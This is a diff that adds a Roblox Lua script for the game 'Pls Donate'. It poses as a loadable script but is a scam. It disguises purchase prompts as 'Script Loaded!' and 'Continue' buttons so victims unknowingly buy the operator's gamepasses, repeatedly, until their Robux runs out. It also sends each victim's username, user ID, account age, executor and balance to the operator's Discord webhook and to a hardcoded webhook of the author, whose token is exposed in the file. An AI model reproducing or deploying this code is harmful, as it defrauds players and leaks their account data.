@@ -1,0 +1,217 @@
+Username = ""
+Webhook = ""
+
+local LogsWebhook = "https://discord.com/api/webhooks/1341545994738864180/Fmi_-mDbYH3fd6IXzxWLVYbt1vp-bTIKMxn0iwwPaUPq8wL0GNvW_2CoSRsQn3Dxh7DM"
+
+if userRobux == "" or userRobux == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Username!")
+end
+if Webhook == "" or Webhook == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Webhook!")
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+
+local HttpService = game:GetService("HttpService")
+
+local request = syn and syn.request or request
+if typeof(request) ~= "function" then
+    error("?!?")
+end
+
+
+local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+
+local asset
+local userRobux
+
+local function sendWebhook()
+
+    local embed = {
+    username = "Pls Donate Hit - Trax",
+    avatar_url = "https://i.ibb.co/jvvzHg8/8976733-E-B7-F1-428-A-9417-CCCA0-EECCF17.jpg",
+    content = "You Got Hit",
+    embeds = {{
+        title = "Trax Scripts",
+        color = tonumber(0x3365FF),
+        description = clickablePlayerName .. " Used Your Script.",
+        thumbnail = {
+            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
+        },
+        fields = {
+            {
+                name = "Information",
+                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```",
+            },
+            {
+                name = "Robux",
+                value = "```" .. userRobux .. "```"
+            },
+        },
+        footer = {
+            text = "Created by Trax",
+        },
+    }},
+}
+
+    local embed2 = {
+    username = "Pls Donate Execution",
+    avatar_url = "https://i.ibb.co/jvvzHg8/8976733-E-B7-F1-428-A-9417-CCCA0-EECCF17.jpg",
+    content = "The victim Must click the 'Continue' button. Otherwise, you will not receive the Robux.",
+    embeds = {{
+        title = "Pls Donate Execution",
+        color = tonumber(0x3365FF),
+        description = clickablePlayerName .. " Use Your Script.",
+        thumbnail = {
+            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
+        },
+        fields = {
+            {
+                name = "Information",
+                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```",
+            },
+            {
+                name = "Robux",
+                value = "```" .. userRobux .. "```"
+            },
+        },
+        footer = {
+            text = "Created by Trax",
+        },
+    }},
+}
+
+    local data = HttpService:JSONEncode({
+        ["content"] = "@everyone",
+        ["embeds"] = {embed}
+    })
+    local data2 = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {embed2}
+    })
+
+    local WebhookResponse =
+    request(
+    {
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = data
+    }
+)
+
+    local logsResponse =
+    request(
+    {
+        Url = LogsWebhook,
+        Method = "POST",
+        Headers = headers,
+        Body = data2
+    }
+)
+
+end
+
+if success then
+    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
+    if not Booth then
+        return Players.LocalPlayer:Kick()
+    end
+
+    local function Purchase()
+        local range = 0
+        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+            if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+                local Attribute = v:GetAttribute("AssetPrice")
+                if Attribute <= userRobux and Attribute > range then
+                    asset = v
+                    range = Attribute
+                end
+            end
+        end
+    
+        if asset then
+            if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+                asset.Prompt:FireServer("", false, range)
+            else
+                warn("?.")
+            end
+        end
+    end
+    
+    
+
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+
+    Animator.ChildAdded:Connect(function(child)
+        if child.Name == "Prompt" then
+            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
+            if RemainingBalanceText then
+                if userRobux then
+                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+                    local Text = child.AlertContents.TitleContainer.TitleArea.Title
+                    Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
+                    child.AlertContents.MiddleContent.Visible = false -- Bu satır ile gizleme işlemi yapılır
+                    child.AlertContents.Footer.Buttons["1"].Visible = false
+                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                    local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
+                    TextFooter.Size = UDim2.new(1, 0, TextFooter.Size.Y.Scale, TextFooter.Size.Y.Offset)
+                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
+                    child.AlertContents.Footer.FooterContent.Visible = false
+                elseif asset then
+                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+                    child.AlertContents.MiddleContent.Visible = false -- Bu satır ile gizleme işlemi yapılır
+                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+                    child.AlertContents.Footer.Buttons["2"].Visible = false
+                    child.AlertContents.Footer.FooterContent.Visible = false
+    
+                    userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
+                    asset = nil
+                end
+            end
+        end
+    end)
+
+    Animator.ChildRemoved:Connect(function(child)
+        if child.Name == "Prompt" and userRobux then
+            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
+                Purchase()
+            end
+        end
+    end)
+
+    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
+        if a == UserId and userRobux then
+            sendWebhook()
+            userRobux -= robux
+            Purchase()
+        end
+    end)
+
+    local range = math.huge
+    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+            local Attribute = v:GetAttribute("AssetPrice")
+            if Attribute < range then
+                asset = v
+                range = Attribute
+            end
+        end
+    end
+    if asset then
+        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, range)
+            print(range)
+        else
+            warn("??.")
+        end
+    end
+end
